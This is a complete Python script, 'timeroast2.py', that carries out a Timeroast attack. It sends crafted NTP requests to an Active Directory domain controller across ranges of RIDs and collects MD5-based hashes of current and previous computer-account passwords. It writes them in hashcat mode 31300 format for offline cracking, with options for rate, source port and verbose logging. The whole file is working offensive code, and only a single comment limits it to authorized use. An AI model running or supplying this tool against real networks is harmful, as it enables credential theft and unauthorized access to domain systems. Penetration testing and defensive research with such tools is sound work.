#!/usr/bin/env python3
# timeroast2.py — Timeroast with CUR/OLD (+ --both) and verbosity (-v / -vv)
#
# python3 timeroast2.py 192.168.100.200 --both -v -o timeroast.log
#
# Hash output (unchanged; for hashcat -m 31300 with --username):
#   "<RID>:$sntp-ms$<md5>$<salt48>"
#
# Flags (unchanged defaults):
#   - default: current only, username "RID"
#   - -l / --old-hashes: old only, username "RID"
#   - --both: current and old in one run; old lines labeled "RID.old"
#
# New:
#   -v / --verbose       -> periodic progress (sent/recv/pps/rps, last RID)
#   -vv (verbose=2)      -> log every send and every reply (RID, CUR/OLD, keyid, md5)
#
# Use only in authorized environments.

import argparse
import sys
import socket
import struct
from binascii import hexlify, unhexlify
from select import select
from time import monotonic, time

# 48-byte NTP request prefix; we append 4B keyid + 16B zero MAC
NTP_REQ_PREFIX = unhexlify(
    'db0011e9000000000001000000000000'
    'e1b8407debc7e5060000000000000000'
    '0000000000000000e1b8428bffbfcd0a'
)

KF_CUR = 0x00000000
KF_OLD = 0x80000000  # previous password selector (high bit)

def b2h(b: bytes) -> str:
    return hexlify(b).decode()

def build_pkt(keyid: int) -> bytes:
    return NTP_REQ_PREFIX + struct.pack('<I', keyid) + (b'\x00' * 16)

def parse_ranges(ranges: str):
    """
    "512-580,600,1103-1200" -> ascending ints.
    If None: iterate from 500 upward until global timeout triggers.
    """
    if not ranges:
        rid = 500
        while True:
            yield rid
            rid += 1
    else:
        spans = []
        for chunk in ranges.split(','):
            chunk = chunk.strip()
            if not chunk:
                continue
            if '-' in chunk:
                lo, hi = chunk.split('-', 1)
                lo, hi = int(lo), int(hi)
                if lo > hi:
                    lo, hi = hi, lo
                spans.append((lo, hi))
            else:
                v = int(chunk)
                spans.append((v, v))
        for lo, hi in sorted(spans):
            for r in range(lo, hi + 1):
                yield r

def is_old_from_keyid(keyid: int) -> bool:
    return (keyid & KF_OLD) != 0

def keyid_for(rid: int, old_hashes: bool) -> int:
    return rid ^ (KF_OLD if old_hashes else KF_CUR)

def ntp_roast(dc: str, rid_ranges: str, rate: float, timeout: float,
              old_hashes: bool, src_port: int, both: bool, verbose: int):
    """
    Generator yielding (mapped_rid, md5digest, salt48, got_keyid).
    - mapped_rid: got_keyid with OLD bit masked off (robust to reordering)
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if src_port:
        sock.bind(('0.0.0.0', src_port))
    addr = (dc, 123)

    qps = float(rate) if rate and rate > 0 else 0.0
    query_interval = (1.0 / qps) if qps > 0 else 0.0

    rid_iter = parse_ranges(rid_ranges)

    last_activity = monotonic()
    sent = 0
    recv = 0
    last_stat_t = time()
    first_rid = None
    last_rid = None

    def log_info(msg: str):
        if verbose >= 1:
            print(msg, file=sys.stderr, flush=True)

    def log_dbg(msg: str):
        if verbose >= 2:
            print(msg, file=sys.stderr, flush=True)

    if verbose >= 1:
        print(f'[*] Target={dc} mode=' + ('BOTH' if both else ('OLD' if old_hashes else 'CUR')),
              file=sys.stderr, flush=True)

    while True:
        now = monotonic()
        if (now - last_activity) >= float(timeout):
            break

        rid = next(rid_iter)
        if first_rid is None:
            first_rid = rid
        last_rid = rid

        if both:
            # send CUR then OLD
            for keyflag in (KF_CUR, KF_OLD):
                keyid = rid ^ keyflag
                pkt = build_pkt(keyid)
                try:
                    sock.sendto(pkt, addr)
                    sent += 1
                    log_dbg(f'[send] rid={rid} type={"OLD" if keyflag==KF_OLD else "CUR"} keyid=0x{keyid:08x}')
                except OSError as e:
                    log_dbg(f'[send-err] rid={rid} err={e}')
        else:
            keyid = keyid_for(rid, old_hashes)
            pkt = build_pkt(keyid)
            try:
                sock.sendto(pkt, addr)
                sent += 1
                log_dbg(f'[send] rid={rid} type={"OLD" if old_hashes else "CUR"} keyid=0x{keyid:08x}')
            except OSError as e:
                log_dbg(f'[send-err] rid={rid} err={e}')

        # opportunistic receive with same pacing as upstream
        ready, _, _ = select([sock], [], [], query_interval)
        if not ready:
            # periodic stats at -v
            if verbose >= 1:
                now_wall = time()
                if now_wall - last_stat_t >= 1.0:
                    elapsed = max(now_wall - (last_stat_t - 1.0), 1.0)  # approximate per-second window
                    pps = sent / max((now_wall - (last_stat_t - 1.0 + (now_wall - last_stat_t))), 1.0)  # stable-ish
                    rps = recv / max((now_wall - (last_stat_t - 1.0 + (now_wall - last_stat_t))), 1.0)
                    print(f'[stats] sent={sent} recv={recv} range={first_rid if first_rid is not None else "-"}->{last_rid} '
                          f'pps~{pps:.0f} rps~{rps:.0f}', file=sys.stderr, flush=True)
                    last_stat_t = now_wall
            continue

        try:
            data, _ = sock.recvfrom(120)
        except OSError as e:
            log_dbg(f'[recv-err] {e}')
            continue

        if len(data) != 68:
            log_dbg(f'[recv-badlen] len={len(data)}')
            continue

        salt48 = data[:48]
        got_keyid = struct.unpack('<I', data[-20:-16])[0]
        md5digest = data[-16:]
        mapped_rid = got_keyid & 0x7fffffff

        recv += 1
        last_activity = monotonic()

        if verbose >= 2:
            log_dbg(f'[recv] rid={mapped_rid} type={"OLD" if is_old_from_keyid(got_keyid) else "CUR"} '
                    f'keyid=0x{got_keyid:08x} md5={b2h(md5digest)}')

        yield (mapped_rid, md5digest, salt48, got_keyid)

def main():
    ap = argparse.ArgumentParser(
        description=(
            "Performs an NTP 'Timeroast' attack against a domain controller. "
            "Outputs the resulting hashes in the hashcat format 31300 with the --username flag "
            '("<RID>:$sntp-ms$<hash>$<salt>").\n\n'
            "Usernames within the hash file are user RIDs. In order to use a cracked "
            "password that does not contain the computer name, either look up the RID "
            "in AD (if you already have some account) or use a computer name list obtained "
            "via reverse DNS, service scanning, SMB NULL sessions etc.\n\n"
            "In order to be able to receive NTP replies root access (or at least high port "
            "listen privileges) is needed."
        )
    )
    ap.add_argument('dc', help='Hostname or IP address of a domain controller that acts as NTP server.')
    ap.add_argument('-o', '--out', metavar='FILE', default=None,
                    help='Hash output file. Writes to stdout if omitted.')
    ap.add_argument('-r', '--rids', metavar='RIDS', default=None,
                    help='Comma-separated list of RIDs to try. Use hypens to specify (inclusive) ranges, e.g. "512-580,600-1400". '
                         'By default, all possible RIDs will be tried until timeout.')
    ap.add_argument('-a', '--rate', metavar='RATE', type=float, default=180.0,
                    help='NTP queries to execute second per second. Higher is faster, but with a greater risk of dropped packages resulting in incomplete results. Default: 180.')
    ap.add_argument('-t', '--timeout', metavar='TIMEOUT', type=float, default=24.0,
                    help='Quit after not receiving NTP responses for TIMEOUT seconds, possibly indicating that RID space has been exhausted. Default: 24.')
    ap.add_argument('-l', '--old-hashes', action='store_true',
                    help='Obtain hashes of the previous computer password instead of the current one.')
    ap.add_argument('-p', '--src-port', metavar='PORT', type=int, default=0,
                    help='NTP source port to use. A dynamic unprivileged port is chosen by default. Could be set to 123 to get around a strict firewall.')
    ap.add_argument('--both', action='store_true',
                    help='Query BOTH current and old per RID. Prints two lines per RID; OLD is labeled "RID.old".')
    ap.add_argument('-v', '--verbose', action='count', default=0,
                    help='-v: periodic stats; -vv: log every send/recv.')

    args = ap.parse_args()

    # If both flags are present, prefer --both (maintains old-hashes semantics when used alone).
    if args.both and args.old_hashes:
        print('[*] Both --both and --old-hashes provided; proceeding with --both.', file=sys.stderr, flush=True)
        args.old_hashes = False

    # Open output target
    try:
        out_f = sys.stdout if args.out is None else open(args.out, 'w')
    except Exception as e:
        print(f'[!] Could not open output file: {e}', file=sys.stderr)
        sys.exit(1)

    try:
        for rid, hashval, salt, got_keyid in ntp_roast(
            args.dc, args.rids, args.rate, args.timeout, args.old_hashes, args.src_port, args.both, args.verbose
        ):
            # Username selection:
            # - default or -l: "RID"
            # - --both and reply is OLD: "RID.old"
            user = f'{rid}.old' if (args.both and is_old_from_keyid(got_keyid)) else str(rid)
            out_f.write(f'{user}:$sntp-ms${b2h(hashval)}${b2h(salt)}\n')
            out_f.flush()
    except KeyboardInterrupt:
        pass
    finally:
        if out_f is not sys.stdout:
            out_f.close()

if __name__ == '__main__':
    main()
